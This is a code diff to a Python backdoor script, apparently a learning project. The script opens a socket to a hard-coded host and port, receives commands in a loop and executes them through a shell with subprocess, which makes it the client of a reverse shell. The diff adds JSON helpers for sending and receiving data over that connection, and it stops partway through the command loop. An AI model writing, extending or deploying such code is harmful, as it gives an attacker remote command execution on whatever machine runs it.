@@ -1,16 +1,20 @@
 import socket
 import subprocess
-
+import json
 class SocketServer:
     def __init__(self,ip,port):
         self.backdoor_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.backdoor_server.connect(("192.168.8.111", 8080))
     def command_send(self,command):
         self.backdoor_server.send((command).encode())
-
     def command_execution(self,command):
         return subprocess.check_output(command, shell=True)
-
+    def json_send(self,data):
+        json_data = json.dumps(data)
+        self.backdoor_server.send(json_data)
+    def json_recv(self):
+        json_data = self.backdoor_server.recv(1024)
+        return json.loads(json_data)
     def exec(self):
         while True:
             command = self.backdoor_server.recv(1024)  # byte
